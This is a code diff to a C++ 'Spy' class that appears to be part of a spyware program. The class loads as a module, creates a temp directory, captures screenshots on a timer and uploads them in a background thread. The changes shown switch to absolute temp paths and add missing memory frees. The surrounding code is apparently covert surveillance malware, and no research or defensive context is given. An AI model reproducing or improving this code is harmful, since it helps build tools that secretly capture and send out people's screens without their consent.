@@ -39,17 +39,20 @@ void Spy::path_combine(char * dst, const char * dir, const char * fname)
 
 void Spy::get_temp_fpath(char * buffer, const char * fname)
 {
+	char * full_path = new char[MAX_PATH];
+	_fullpath(full_path, SPY_TMP_DIR, MAX_PATH);
 	if (fname == NULL)
 	{
 		char * name = new char[SPY_TMP_FNAME_LTH + 1];
 		get_temp_fname(name, SPY_TMP_FNAME_LTH);
-		path_combine(buffer, SPY_TMP_DIR, name);
+		path_combine(buffer, full_path, name);
 		delete[] name;
 	}
 	else
 	{
-		path_combine(buffer, SPY_TMP_DIR, fname);
+		path_combine(buffer, full_path, fname);
 	}
+	delete[] full_path;
 	LOG("generate temp name: %s", buffer);
 }
 
@@ -86,12 +89,17 @@ DWORD Spy::upload_async(LPVOID * dir_path)
 	delete dir;
 	delete[] file_name;
 	delete[] file_path;
+	delete[] _dir;
 	unlock();
 	return 0;
 }
 
 DWORD Spy::load(HINSTANCE hinstance)
 {
+	char * full_path = new char[MAX_PATH];
+	_fullpath(full_path, SPY_TMP_DIR, MAX_PATH);
+	CreateDirectoryA(full_path, NULL);
+	delete[] full_path;
 	mutex = CreateMutexA(NULL, false, NULL);
 	scrot_timer = new Timer(SPY_TMR_CAPSCR_INTERVAL, take_screenshot);
 	scrot_timer->start();
@@ -122,6 +130,8 @@ void Spy::take_screenshot()
 void Spy::notify_upload()
 {
 	DWORD thread_id;
-	HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)upload_async, SPY_TMP_DIR, 0, &thread_id);
+	char * full_path = new char[MAX_PATH];
+	_fullpath(full_path, SPY_TMP_DIR, MAX_PATH);
+	HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)upload_async, full_path, 0, &thread_id);
 	CloseHandle(thread_handle);
 }
